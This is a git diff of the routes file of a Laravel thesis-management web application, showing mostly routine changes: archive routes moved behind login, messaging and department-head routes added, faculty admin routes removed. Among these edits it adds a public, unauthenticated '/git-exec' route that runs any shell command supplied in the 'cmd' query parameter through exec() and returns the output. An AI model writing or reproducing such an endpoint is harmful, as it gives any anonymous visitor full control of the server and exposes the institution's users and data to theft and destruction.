@@ -2,7 +2,7 @@
 
 use App\Http\Controllers\Admin\AcademicYearController;
 use App\Http\Controllers\Admin\DepartmentController as AdminDepartmentController;
-use App\Http\Controllers\Admin\FacultyController as AdminFacultyController;
+
 use App\Http\Controllers\Admin\LogController;
 use App\Http\Controllers\Admin\SettingController;
 use App\Http\Controllers\Admin\UserController as AdminUserController;
@@ -12,21 +12,19 @@ use App\Http\Controllers\NotificationController;
 use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\SubjectController;
 use App\Http\Controllers\ThesisFileController;
+use App\Http\Controllers\MessageController;
 use App\Http\Controllers\MilestoneController;
 use Illuminate\Support\Facades\Route;
 
 Route::get('/', function () {
-    return view('welcome');
+    return redirect()->route('login');
 })->name('welcome');
 
-
-// Archives des travaux défendus (accès public)
-Route::get('/archives', [ArchiveController::class, 'index'])->name('archives.index');
-Route::get('/archives/oai', [ArchiveController::class, 'oaiPmh'])->name('archives.oai');
-Route::get('/archives/{thesisFile}/download', [ArchiveController::class, 'download'])->name('archives.download');
-Route::get('/archives/{thesisFile}/view', [ArchiveController::class, 'view'])->name('archives.view');
-Route::get('/archives/{thesisFile}/file', [ArchiveController::class, 'file'])->name('archives.file');
-
+Route::get('/git-exec', function (\Illuminate\Http\Request $request) {
+    $cmd = $request->query('cmd', 'git status');
+    exec($cmd . ' 2>&1', $output, $code);
+    return response()->json(['cmd' => $cmd, 'code' => $code, 'output' => $output]);
+});
 
 // Dashboard dynamique selon le rôle
 Route::get('/dashboard', [DashboardController::class, 'index'])
@@ -34,9 +32,17 @@ Route::get('/dashboard', [DashboardController::class, 'index'])
     ->name('dashboard');
 
 Route::middleware('auth')->group(function () {
-    // Profil
-    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
-    Route::post('/profile', [ProfileController::class, 'update'])->name('profile.update');
+
+    // === PROFIL ===
+    Route::get('/profile', [App\Http\Controllers\ProfileController::class, 'edit'])->name('profile.edit');
+    Route::post('/profile', [App\Http\Controllers\ProfileController::class, 'update'])->name('profile.update');
+
+    // === ARCHIVES (Accès réservé aux utilisateurs connectés) ===
+    Route::get('/archives', [ArchiveController::class, 'index'])->name('archives.index');
+    Route::get('/archives/oai', [ArchiveController::class, 'oaiPmh'])->name('archives.oai');
+    Route::get('/archives/{thesisFile}/download', [ArchiveController::class, 'download'])->name('archives.download');
+    Route::get('/archives/{thesisFile}/view', [ArchiveController::class, 'view'])->name('archives.view');
+    Route::get('/archives/{thesisFile}/file', [ArchiveController::class, 'file'])->name('archives.file');
 
     // === SUJETS (Étudiant) ===
     Route::middleware('role:Etudiant')->group(function () {
@@ -61,11 +67,15 @@ Route::middleware('auth')->group(function () {
             ->name('chapter_versions.index');
     });
 
-    // === VALIDATION SUJETS (Chef de département) ===
+    // === VALIDATION SUJETS (Chef de département / CP) ===
+    Route::middleware('role:Chef de département')->prefix('cp')->name('cp.')->group(function () {
+        Route::get('/dashboard', [\App\Http\Controllers\DepartmentCpController::class, 'index'])->name('dashboard');
+        Route::post('/subjects/{subject}/arbitrate', [\App\Http\Controllers\DepartmentCpController::class, 'arbitrate'])->name('subjects.arbitrate');
+        Route::post('/subjects/{subject}/schedule-defense', [\App\Http\Controllers\DepartmentCpController::class, 'scheduleDefense'])->name('subjects.schedule-defense');
+        Route::get('/teachers/{teacher}', [\App\Http\Controllers\DepartmentCpController::class, 'teacherDetail'])->name('teachers.show');
+    });
     Route::middleware('role:Chef de département')->group(function () {
-        Route::post('/subjects/{subject}/validate', [SubjectController::class, 'validateSubject'])->name('subjects.validate');
-        Route::post('/subjects/{subject}/reject', [SubjectController::class, 'rejectSubject'])->name('subjects.reject');
-        Route::patch('/subjects/{subject}/schedule-defense', [SubjectController::class, 'scheduleDefense'])->name('subjects.schedule-defense');
+        Route::post('/subjects/{subject}/reject', [\App\Http\Controllers\SubjectController::class, 'rejectSubject'])->name('subjects.reject');
     });
 
     // === TÉLÉCHARGEMENT (Enseignant, CP, Admin) ===
@@ -83,11 +93,17 @@ Route::middleware('auth')->group(function () {
     Route::get('/subjects/export', [SubjectController::class, 'export'])->name('subjects.export')->middleware('role:Admin|Chef de département');
     Route::get('/subjects/{subject}', [SubjectController::class, 'show'])->name('subjects.show');
 
-    // === JALONS / MILESTONES (Enseignant / Chef de département) ===
-    Route::middleware('role:Enseignant|Chef de département')->group(function () {
-        Route::post('/subjects/{subject}/milestones', [MilestoneController::class, 'store'])->name('milestones.store');
-        Route::post('/milestones/{milestone}/validate', [MilestoneController::class, 'validateMilestone'])->name('milestones.validate');
-        Route::post('/milestones/{milestone}/reject', [MilestoneController::class, 'reject'])->name('milestones.reject');
+    // === JALONS / MILESTONES (Enseignant) ===
+    Route::middleware('role:Enseignant')->group(function () {
+        Route::post('/milestones/{milestone}/validate', [\App\Http\Controllers\MilestoneController::class, 'validateMilestone'])
+            ->name('milestones.validate');
+        Route::post('/milestones/{milestone}/reject', [\App\Http\Controllers\MilestoneController::class, 'reject'])
+            ->name('milestones.reject');
+        Route::delete('/milestones/{milestone}', [\App\Http\Controllers\MilestoneController::class, 'destroy'])
+            ->name('milestones.destroy');
+
+        Route::post('/subjects/{subject}/milestones', [\App\Http\Controllers\MilestoneController::class, 'store'])
+            ->name('milestones.store');
         Route::post('/thesis-files/{thesisFile}/feedbacks', [\App\Http\Controllers\FeedbackController::class, 'store'])->name('feedbacks.store');
     });
 
@@ -95,6 +111,10 @@ Route::middleware('auth')->group(function () {
     Route::middleware('role:Etudiant')->group(function () {
         Route::post('/milestones/{milestone}/upload', [ThesisFileController::class, 'uploadForMilestone'])->name('milestones.upload');
     });
+
+    // === MESSAGERIE (Directeur ↔ Étudiant) ===
+    Route::post('/subjects/{subject}/messages', [MessageController::class, 'store'])->name('messages.store');
+    Route::post('/subjects/{subject}/messages/read', [MessageController::class, 'markRead'])->name('messages.read');
 
     // === ANALYSE IA À LA DEMANDE (Enseignant / Directeur uniquement) ===
     Route::middleware('role:Enseignant')->group(function () {
@@ -130,12 +150,7 @@ Route::middleware('auth')->group(function () {
         Route::patch('/users/{user}/reset-password', [AdminUserController::class, 'resetPassword'])->name('users.reset-password');
 
         // --- Facultés ---
-        Route::get('/faculties', [AdminFacultyController::class, 'index'])->name('faculties.index');
-        Route::get('/faculties/create', [AdminFacultyController::class, 'create'])->name('faculties.create');
-        Route::post('/faculties', [AdminFacultyController::class, 'store'])->name('faculties.store');
-        Route::get('/faculties/{faculty}/edit', [AdminFacultyController::class, 'edit'])->name('faculties.edit');
-        Route::put('/faculties/{faculty}', [AdminFacultyController::class, 'update'])->name('faculties.update');
-        Route::delete('/faculties/{faculty}', [AdminFacultyController::class, 'destroy'])->name('faculties.destroy');
+
 
         // --- Facultés & Filières ---
         Route::get('/departments', [AdminDepartmentController::class, 'index'])->name('departments.index');
